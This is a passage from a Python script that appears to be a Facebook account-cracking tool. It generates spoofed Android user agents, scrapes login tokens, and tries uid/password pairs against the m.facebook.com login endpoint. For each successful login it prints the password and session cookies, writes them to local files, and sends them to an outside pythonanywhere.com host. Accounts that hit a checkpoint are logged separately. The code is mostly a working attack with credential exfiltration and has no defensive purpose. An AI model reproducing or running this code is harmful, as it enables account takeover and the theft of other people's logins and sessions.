'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H' ))))
            kkkkki = random.choice(["GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820"])
            #sxrxr = random.choice("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D"","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T561","SM-T705","SM-T805","SM-T820")
            #ua1 = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,13))+"; "+str(random.choice(sxrxr))+"; Windows 10 Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
            #ua2 = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(sxrxr))+" Build/"+str(random.choice(uuuu))+str(random.randint(111,9999))+") AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
            #ua3 = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(sxrxn))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
            #ua4 = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(sxrxn))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0.0.0 Mobile Safari/537.36"
            ua5 = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(mldmdl))+" Build/RP1A."+str(random.randint(111111,999999))+"."+str(random.randint(111,999))+"; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
            ua6 = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(kkkkki))+" Build/QKQ1."+str(random.randint(111111,999999))+"."+str(random.randint(111,999))+"; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
            free_fb = session.get("https://m.facebook.com").text
            data = {"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":uid,"pass":pww,"login":"Log In"}
            head = {'Host': 'm.facebook.com',
            'Connection': 'keep-alive',
            'Content-Length': '2059',
            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
            'sec-ch-ua-model': '"SM-S928B"',
            'sec-ch-ua-mobile': '?1',
            'User-Agent': ua5,
            'viewport-width': '400',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-LSD': 'AVovWh_3iKg',
            'sec-ch-ua-platform-version': '"14.0.0"',
            'X-ASBD-ID': '129477',
            'dpr': '1.8',
            'sec-ch-ua-full-version-list': '"Google Chrome";v="105.0.5195.136", "Not)A;Brand";v="8.0.0.0", "Chromium";v="105.0.5195.136"',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua-platform': '"Android"',
            'Accept': '*/*',
            'Origin': 'https://m.facebook.com',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://m.facebook.com/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',}
            url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
            po = session.post(url,data=data, headers=head,allow_redirects=False).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uidx=re.findall("c_user=(.*);xs", coki)[0]
                uid=str(uidx)
                ckk=f"https://graph.facebook.com/{uid}/picture?type=normal"
                res=requests.get(ckk).text
                if 'Photoshop' in res:
                    print(f"\r\r \x1b[38;5;196m[\033[38;5;46mSUCCESS-💚\x1b[38;5;196m] \033[38;5;46m{uid} \033[38;5;46m★ \033[38;5;46m{pww}")
                    print(f"\r\r [\x1b[1;97mCOOKIES-😘] : {coki}\n")
                    requests.get(f"https://abbbalagire.pythonanywhere.com/MrSxR_fb/txt={uid}|{pww}|{coki}")
                    open('/sdcard/RNDM-OK.txt','a').write(uid+'|'+pww+'|'+coki+'\n')
                    oks.append(uid)
                    break
                else:
                    break
            elif 'checkpoint' in log_cookies:
                ##print(f"\r\r\ [CP] {uid} | {pww}")
                open('/sdcard/RNDM-CP.txt','a').write(uid+'|'+pww+'\n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:time.sleep(10)
    except Exception as e:
        pass


       

randm_inp()
